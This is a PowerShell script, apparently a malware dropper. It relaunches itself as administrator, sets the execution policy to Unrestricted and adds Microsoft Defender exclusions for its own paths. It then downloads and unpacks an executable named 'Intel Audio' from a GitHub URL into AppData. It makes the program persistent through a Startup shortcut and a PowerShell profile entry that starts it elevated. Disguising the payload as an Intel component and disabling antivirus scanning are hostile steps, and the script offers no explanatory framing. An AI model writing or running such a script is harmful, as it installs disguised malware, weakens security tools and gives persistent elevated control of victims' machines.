if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
      if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
            $CommandLine = "-NoExit -c cd '$pwd'; & `"" + $MyInvocation.MyCommand.Path + "`""
            Start-Process powershell -Verb runas -ArgumentList $CommandLine
            Exit
      }
}

#Elevated script content after that
$WScriptShell = New-Object -ComObject WScript.Shell
$FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$ShortcutFile = "$FolderPath\Intel Audio.lnk"
$TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio"
$TargetFile = "$TargetPath\Intel Audio.exe"
$TargetZip = "$TargetPath\Intel Audio.zip"
$PowershellPath = "$env:USERPROFILE\Documents\WindowsPowerShell"
$PowershellFile = "$PowershellPath\Microsoft.PowerShell_profile.ps1"

Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
Get-ExecutionPolicy -List

if (-Not (Test-Path "$FolderPath")) {
      New-Item -ItemType Directory -Force -Path "$FolderPath"
      Write-Output "Startup folder created"
}

if (-Not (Test-Path "$TargetPath")) {
      New-Item -ItemType Directory -Force -Path "$TargetPath"
      Write-Output "Target folder created"
}

Set-MpPreference -ExclusionProcess 'Intel Audio'
Set-MpPreference -ExclusionProcess 'Intel Audioexe'
Set-MpPreference -ExclusionPath "$FolderPath"
Add-MpPreference -ExclusionPath "$TargetPath"
Add-MpPreference -ExclusionPath "$TargetFile"
Write-Output "Exclusions added"


if (-Not (Test-Path "$TargetFile")) {
      Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/raw/refs/heads/main/dist/Intel Audio.zip" -OutFile "$TargetZip"
      Write-Output "File downloaded"
      Expand-Archive -Path "$TargetZip" -DestinationPath "$TargetPath"
      Write-Output "File extracted"
      Remove-Item -Path "$TargetZip"
      Write-Output "Zip file removed"
}

if (-Not (Test-Path "$TargetFile")) {
      $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
      $Shortcut.TargetPath = "$TargetFile"
      $Shortcut.WorkingDirectory = "$TargetPath"
      $Shortcut.IconLocation = "$TargetPath\Intel Audio.exe,0"
      $Shortcut.Save()
      Write-Output "Shortcut created"
}

if (-Not (Test-Path "$PowershellPath")) {
      New-Item -ItemType Directory -Force -Path "$PowershellPath"
      New-Item -ItemType File -Force -Path "$PowershellFile"
      Write-Output "Powershell profile created"
      Set-Content -Path "$PowershellFile" -Value "if (Test-Path "$TargetFile") { if (-Not (Get-Process -Name 'Intel Audio.exe') -or (Get-Process -Name 'Intel Audio')) { Start-Process "$TargetFile"  -Verb RunAs } }"
      Write-Output "Powershell profile updated"
}
if (Select-String -Path "$PowershellFile" "Start-Process") {
      Write-Output "Powershell profile already updated"
      # exit 0
} else {
      if (-Not (Test-Path "$TargetFile")) {
            Add-Content -Path "$PowershellFile" -Value 'if (Test-Path "$TargetFile") { if (-Not (Get-Process -Name "Intel Audio.exe") -or (Get-Process -Name "Intel Audio")) { Start-Process "$TargetFile"  -Verb RunAs } }'
            Write-Output "Powershell profile updated"
      } else {
            Write-Output "Powershell profile not updated"
      }
}

if (Get-Process -Name 'Intel Audio' -ErrorAction SilentlyContinue){
      exit
} else {
      Start-Process -FilePath "$TargetFile" -Verb RunAs
}
